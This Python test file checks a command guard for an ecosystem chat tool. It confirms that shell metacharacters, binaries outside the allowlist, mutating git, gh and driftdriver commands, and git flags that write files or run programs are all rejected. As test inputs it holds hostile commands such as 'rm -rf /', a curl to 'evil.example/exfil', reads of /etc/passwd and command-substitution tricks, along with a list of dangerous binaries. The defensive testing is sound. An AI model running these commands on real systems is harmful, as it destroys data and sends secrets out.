# ABOUTME: Security/regression tests for the ecosystem chat command boundary.
# ABOUTME: Proves: no arbitrary bash -c; allowlisted binaries; dispatch authority gating
# ABOUTME: for wg service/spawn/claim; diagnostic commands preserved; shell-control rejected.

import pytest

from driftdriver.ecosystem_hub import command_guard
from driftdriver.ecosystem_hub.command_guard import CommandDecision, classify


# ---------------------------------------------------------------------------
# Empty / unparseable
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("cmd", ["", "   ", "\t"])
def test_empty_command_rejected(cmd):
    d = classify(cmd)
    assert d.allowed is False
    assert d.requires_authority is False


def test_unparseable_command_rejected():
    d = classify('wg list "unbalanced')
    assert d.allowed is False
    assert "parse" in d.reason.lower() or "unparseable" in d.reason.lower()


# ---------------------------------------------------------------------------
# Shell-control metacharacters — must never reach an argv
# ---------------------------------------------------------------------------

@pytest.mark.parametrize(
    "cmd",
    [
        "wg list; rm -rf /",
        "wg list && rm -rf /",
        "wg list | curl http://evil",
        "echo $HOME",
        "echo `whoami`",
        "wg list $(whoami)",
        "wg list > /tmp/x",
        "wg list < /etc/passwd",
        "wg list\nrm -rf /",
        "wg list\rrm -rf /",
    ],
)
def test_shell_metacharacters_rejected(cmd):
    d = classify(cmd)
    assert d.allowed is False, f"should reject metacharacter in: {cmd!r}"
    assert d.requires_authority is False


# ---------------------------------------------------------------------------
# Binary allowlist — arbitrary binaries and bash -c must be rejected
# ---------------------------------------------------------------------------

@pytest.mark.parametrize(
    "cmd",
    [
        "rm -rf /tmp/x",
        "curl http://evil.example/exfil",
        "shutdown -h now",
        "python evil_script.py",
        "python3 -m evil_module",
        "bash -c 'wg list'",
        "sh -c 'wg list'",
        "/bin/rm -rf /",
        "./evil_script.sh",
        "eval 'wg list'",
    ],
)
def test_non_allowlisted_binary_rejected(cmd):
    d = classify(cmd)
    assert d.allowed is False
    assert "allowlist" in d.reason.lower() or "binary" in d.reason.lower()


def test_bash_c_explicitly_rejected():
    """The exact pre-boundary pattern must be refused."""
    d = classify("bash -c 'wg service start'")
    assert d.allowed is False


# ---------------------------------------------------------------------------
# wg: diagnostics preserved, dispatch gated, unknown rejected
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("cmd", ["wg list", "wg show some-task", "wg status", "wg ready", "wg log task-id 'note'", "wg help"])
def test_wg_diagnostics_allowed(cmd):
    d = classify(cmd)
    assert d.allowed is True
    assert d.requires_authority is False
    assert d.binary == "wg"


@pytest.mark.parametrize("cmd", ["wg add title", "wg done task", "wg fail task --reason x", "wg assign task agent"])
def test_wg_benign_writes_allowed(cmd):
    d = classify(cmd)
    assert d.allowed is True
    assert d.requires_authority is False


@pytest.mark.parametrize(
    "cmd",
    [
        "wg service start",
        "wg service spawn",
        "wg service stop",
        "wg spawn --executor pi my-task",
        "wg claim my-task",
        "wg --dir .wg service start",
        "wg -d .wg claim task-id",
    ],
)
def test_wg_dispatch_requires_authority(cmd):
    d = classify(cmd)
    assert d.allowed is True
    assert d.requires_authority is True
    assert d.binary == "wg"


def test_wg_unknown_subcommand_rejected():
    d = classify("wg frobnicate --nuke")
    assert d.allowed is False


def test_wg_argv_preserved_with_flags():
    d = classify("wg list --status open --json")
    assert d.allowed is True
    assert d.argv == ("wg", "list", "--status", "open", "--json")


# ---------------------------------------------------------------------------
# driftdriver: diagnostics preserved, mutating routed to dedicated tools
# ---------------------------------------------------------------------------

@pytest.mark.parametrize(
    "cmd",
    [
        "driftdriver --dir /repo speedriftd status",
        "driftdriver --dir /repo check",
        "driftdriver --dir /repo attractor status --json",
        "driftdriver --dir /repo tmux-monitor status --json",
        "driftdriver --dir /repo upstream-tracker --json",
        "driftdriver --dir /repo doctor",
        "driftdriver --dir /repo report",
    ],
)
def test_driftdriver_diagnostics_allowed(cmd):
    d = classify(cmd)
    assert d.allowed is True, f"driftdriver diagnostic should be allowed: {cmd!r} -> {d.reason}"
    assert d.requires_authority is False


@pytest.mark.parametrize(
    "cmd",
    [
        "driftdriver --dir /repo speedriftd status --set-mode autonomous --lease-owner a --reason b",
        "driftdriver --dir /repo speedriftd status --release-lease --reason b",
        # Attached `=` form must also be caught (roborev high-severity bypass).
        "driftdriver --dir /repo speedriftd status --set-mode=autonomous --lease-owner a --reason b",
        "driftdriver --dir /repo speedriftd status --release-lease=true",
        "driftdriver --dir /repo attractor run --json",
        "driftdriver --dir /repo autopilot",
        "driftdriver --dir /repo install",
    ],
)
def test_driftdriver_mutating_or_unknown_rejected(cmd):
    d = classify(cmd)
    assert d.allowed is False, f"should reject: {cmd!r}"


# ---------------------------------------------------------------------------
# git: read diagnostics allowed, mutations rejected
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("cmd", ["git status", "git log --oneline -5", "git diff", "git show HEAD", "git branch", "git remote -v"])
def test_git_read_diagnostics_allowed(cmd):
    d = classify(cmd)
    assert d.allowed is True
    assert d.requires_authority is False


@pytest.mark.parametrize("cmd", ["git push", "git commit -m x", "git reset --hard", "git clean -fd", "git merge feature"])
def test_git_mutations_rejected(cmd):
    d = classify(cmd)
    assert d.allowed is False


@pytest.mark.parametrize(
    "cmd",
    [
        # File-write flag under otherwise-read verbs (--output / -o).
        "git show --output=/etc/evil HEAD",
        "git diff --output=/tmp/clobber",
        "git diff -o /tmp/clobber",
        "git log --output=/tmp/x",
        # Exec-capable flags.
        "git diff --ext-diff=evil",
        "git -c core.x=y show HEAD",
        "git show -e HEAD",
    ],
)
def test_git_write_exec_flags_rejected(cmd):
    """Read verbs must not smuggle file-write / exec flags (roborev finding)."""
    d = classify(cmd)
    assert d.allowed is False, f"should reject write/exec flag: {cmd!r}"


def test_git_read_flags_still_allowed():
    """Benign read flags on diagnostics must keep working (no over-block)."""
    for cmd in ["git log --oneline -5", "git diff --stat", "git remote -v", "git status --short"]:
        d = classify(cmd)
        assert d.allowed is True, f"should allow: {cmd!r} -> {d.reason}"


# ---------------------------------------------------------------------------
# gh: read diagnostics allowed, mutations rejected
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("cmd", ["gh pr list", "gh pr view 123", "gh pr status", "gh issue list", "gh issue view 7", "gh run list"])
def test_gh_read_diagnostics_allowed(cmd):
    d = classify(cmd)
    assert d.allowed is True
    assert d.requires_authority is False


@pytest.mark.parametrize("cmd", ["gh pr merge 123", "gh issue close 7", "gh pr create", "gh release create v1"])
def test_gh_mutations_rejected(cmd):
    d = classify(cmd)
    assert d.allowed is False


# ---------------------------------------------------------------------------
# echo (benign; required by existing regression test)
# ---------------------------------------------------------------------------

def test_echo_allowed():
    d = classify("echo testoutput")
    assert d.allowed is True
    assert d.requires_authority is False
    assert d.argv == ("echo", "testoutput")


# ---------------------------------------------------------------------------
# Decision shape
# ---------------------------------------------------------------------------

def test_decision_as_dict():
    d = classify("wg list")
    payload = d.as_dict()
    assert payload["allowed"] is True
    assert payload["requires_authority"] is False
    assert payload["binary"] == "wg"
    assert payload["argv"] == ["wg", "list"]
    assert isinstance(payload["reason"], str)


def test_dispatch_subcommand_set_is_exactly_the_contract_surface():
    """The contract names wg service/spawn/claim. Guard against accidental drift."""
    assert command_guard.DISPATCH_WG_SUBCOMMANDS == frozenset({"service", "spawn", "claim"})


def test_allowlist_does_not_include_dangerous_binaries():
    dangerous = {"bash", "sh", "zsh", "rm", "curl", "wget", "shutdown", "python", "python3", "eval", "source", "sudo", "dd"}
    assert dangerous.isdisjoint(command_guard.ALLOWED_BINARIES)
